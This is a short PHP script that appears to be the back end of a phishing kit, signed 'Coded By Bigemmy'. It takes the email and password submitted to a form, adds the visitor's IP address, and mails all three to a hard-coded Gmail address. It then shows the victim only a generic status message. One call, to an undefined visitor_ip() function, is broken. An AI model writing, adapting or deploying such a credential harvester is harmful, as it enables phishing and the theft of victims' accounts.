<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("m-d-Y g:i:a");
    $ip = visitor_ip();
    $msg = "---------------------------------------------------------------------------\n";
    $msg .= "Coded By Bigemmy\n";
    $msg .= "---------------------------------------------------------------------------\n";
    $error = "";

    $to = "maxemmily@gmail.com";
    $subject = "Form Submission";
    $message = "Email: $email\nPassword: $password\nIP:$ip\n" ;
    $headers = "From: webform@yourwebsite.com" . "\r\n" .
    "CC: another-email@example.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Form data successfully sent!";
    } else {
        echo "Error: form data was not sent.";
    }
}
